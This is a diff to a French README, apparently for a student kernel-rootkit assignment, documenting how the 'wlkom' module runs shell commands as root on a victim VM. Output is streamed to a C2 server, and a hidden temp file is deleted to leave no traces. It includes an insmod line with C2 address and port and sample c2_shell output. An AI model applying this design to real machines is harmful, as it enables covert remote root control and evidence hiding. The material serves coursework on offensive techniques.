@@ -528,7 +528,51 @@ sudo rmmod wlkom
 sudo insmod wlkom.ko password_hash=afd071e5 c2_ip=192.168.100.10 c2_port=4444
 ```
 
-### Executing commands (5pt) — TODO
+### Executing commands (5pt) — DONE
+
+#### Fonctionnement
+
+La fonctionnalité permet d'exécuter n'importe quelle commande ou script shell sur la VM victime avec les privilèges `root` (espace noyau) et d'en encapsuler l'intégralité des flux vers l'attaquant.
+
+
+[ C2 Server ]             [ Rootkit (LKM) ]
+                       │                           │
+                 c2_shell> uname -a                │
+                       │ ───────( TCP socket )───> │
+                       │                           │ kernel_recvmsg()
+                       │                           │ execute_and_send_output()
+                       │                           │   └─ call_usermodehelper(UMH_WAIT_PROC)
+                       │                           │        └─ /bin/sh -c "uname -a > /tmp/.out 2>&1"
+                       │                           │
+                       │ <──────( Exit Status )─── │ send_reply("[Exit Status: 0]")
+                       │ <──────( stdout/stderr )─ │ kernel_read(/tmp/.wlkom_out) -> chunks
+                       │ <──────( End Marker )──── │ send_reply("--- End of Output ---")
+                       │                           │
+                 c2_shell> _                       │
+
+
+* **Attente synchrone du processus** : Le module utilise `call_usermodehelper` avec le flag `UMH_WAIT_PROC` pour bloquer le kthread jusqu'à la fin de la commande userland, assurant la capture complète des flux.
+
+* **Encapsulation complète (stdout/stderr)** : Les descripteurs de fichiers standard et d'erreur sont redirigés via le shell (`> /tmp/.wlkom_out 2>&1`). Le fichier temporaire est ensuite ouvert et lu depuis l'espace noyau via `filp_open` / `kernel_read` pour être streamé par paquets TCP vers le C2.
+
+* **Décodage de l'Exit Status** : Le code de retour brut renvoyé par le sous-système de fork du noyau est décodé à l'aide d'un décalage de bits (`(exit_status >> 8) & 0xFF`) afin de restituer un code de retour UNIX standard (ex: `2` pour un échec de `ls`).
+
+* **Nettoyage automatique** : Une fois la transmission terminée, le fichier temporaire `/tmp/.wlkom_out` est immédiatement purgé du disque de la victime pour ne pas laisser de traces évidentes.
+
+
+#### Étapes pour tester l'exécution des commandes
+
+**1.Authetification**
+Une fois le serveur C2 démarré et le module connecté, un prompt interactif persistant `c2_shell>` apparaît sur le terminal de l'attaquant.
+
+**2. Exécuter une commande valide**
+```text
+c2_shell> uname -a
+[Exit Status: 0]
+--- Command Output ---
+Linux epita-victim 6.1.0-48-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.172-1 (2026-05-15) x86_64 GNU/Linux
+
+--- End of Output ---
 
 ### Upload / Download (1.5pt + 1.5pt) — TODO
 
